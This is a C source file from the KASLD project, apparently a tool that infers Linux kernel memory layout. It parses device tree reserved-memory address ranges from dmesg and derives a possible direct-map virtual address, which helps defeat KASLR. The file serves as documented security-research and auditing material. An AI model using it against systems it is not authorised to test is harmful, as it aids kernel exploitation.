// This file is part of KASLD - https://github.com/bcoles/kasld
//
// The device tree reserved memory subsystem prints physical address ranges
// of all reserved memory regions to dmesg during boot:
//
//   OF: reserved mem: 0x0000000080000000..0x00000000801fffff (2048 KiB)
//     nomap non-reusable mmode_resv0@80000000
//   OF: reserved mem: 0x0000000088000000..0x000000008bffffff (65536 KiB)
//     map reusable linux,cma@88000000
//
// These messages are emitted unconditionally (pr_info) during early FDT
// reserved memory initialization. Present on ARM, ARM64, RISC-V, MIPS,
// PowerPC, and any architecture using device trees.
//
// This is a generic version covering all reserved-mem nodes. The existing
// dmesg_reserved_mem_opensbi component specifically targets OpenSBI
// mmode_resv0 entries on RISC-V.
//
// Leak primitive:
//   Data leaked:      physical address ranges of device tree reserved memory
//   Kernel subsystem: drivers/of/of_reserved_mem — __reserved_mem_init_node()
//   Data structure:   reserved memory node entries (physical address + size)
//   Address type:     physical (DRAM)
//   Method:           parsed (dmesg string)
//   Status:           unfixed (printed unconditionally during boot)
//   Access check:     do_syslog() → check_syslog_permissions(); gated by
//                     dmesg_restrict
//   Source:
//   https://elixir.bootlin.com/linux/v6.12/source/drivers/of/of_reserved_mem.c#L463
//
// Mitigations:
//   Access gated by dmesg_restrict (see dmesg.h for shared access gate
//   details). Only present on device tree platforms (ARM, ARM64, RISC-V,
//   MIPS, PPC). On decoupled architectures, physical addresses cannot
//   derive the virtual text base.
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
//
// References:
// https://elixir.bootlin.com/linux/v6.12/source/drivers/of/of_reserved_mem.c#L463
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/dmesg.h"
#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define range_ctx addr_range

KASLD_EXPLAIN("Searches dmesg for device tree reserved memory messages (OF: "
              "reserved mem) that print physical address ranges for firmware-"
              "reserved regions. Common on ARM, ARM64, RISC-V, MIPS, and "
              "PowerPC. Access is gated by dmesg_restrict.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "addr:physical\n"
           "sysctl:dmesg_restrict>=1\n"
           "bypass:CAP_SYSLOG\n"
           "fallback:/var/log/dmesg\n");

/* Parse "0x<start>..0x<end>" from reserved mem lines */
static int on_match(const char *line, void *ctx) {
  struct range_ctx *r = ctx;

  const char *p = strstr(line, "0x");
  if (!p)
    return 1;

  char *endptr;
  unsigned long start = strtoul(p, &endptr, 16);
  if (!start || endptr[0] != '.' || endptr[1] != '.')
    return 1;

  /* skip ".." */
  const char *q = strstr(endptr, "0x");
  if (!q)
    return 1;

  unsigned long end = strtoul(q, &endptr, 16);
  if (!end)
    return 1;

  if (!r->lo || start < r->lo)
    r->lo = start;
  if (end > r->hi)
    r->hi = end;

  /* Each "OF: reserved mem:" line is one contiguous reserved region fully
   * spanning [start, end] (end is the inclusive last address), so emit it as a
   * bounded range: the engine can then exclude the whole forbidden band
   * (phys_reservation_exclude), which a pair of disconnected interior points
   * cannot drive. Reserved regions are sparse — the gaps between them are NOT
   * known-empty — so this is a range, never a covering extent. */
  if (end > start)
    kasld_result_range(KASLD_TYPE_PHYS, REGION_RESERVED_MEM, start, end, NULL,
                       CONF_PARSED);

  return 1; /* continue — multiple regions */
}

int main(void) {
  struct range_ctx r = {0, 0};

  kasld_info("searching dmesg for device tree reserved memory regions ...");
  int ds = dmesg_search("OF: reserved mem:", on_match, &r);

  if (!r.lo) {
    kasld_err("no device tree reserved memory regions found in dmesg");
    if (ds < 0)
      return KASLD_EXIT_NOPERM;
    return 0;
  }

  kasld_info("lowest reserved mem physical address:  0x%016lx", r.lo);
  kasld_info("highest reserved mem physical address: 0x%016lx", r.hi);

  /* Per-region forbidden bands are emitted in on_match(); the directmap
   * projection below derives one virtual landmark from the lowest region. */

#ifdef phys_to_directmap_virt
  unsigned long virt = phys_to_directmap_virt(r.lo);
  kasld_info("possible direct-map virtual address: 0x%016lx", virt);
  kasld_result_sample(KASLD_TYPE_VIRT, REGION_DIRECTMAP, virt, NULL,
                      CONF_PARSED);
#else
  kasld_info("note: phys and virt KASLR are decoupled on this arch; "
             "cannot derive kernel text virtual address from physical leak");
#endif

  return 0;
}
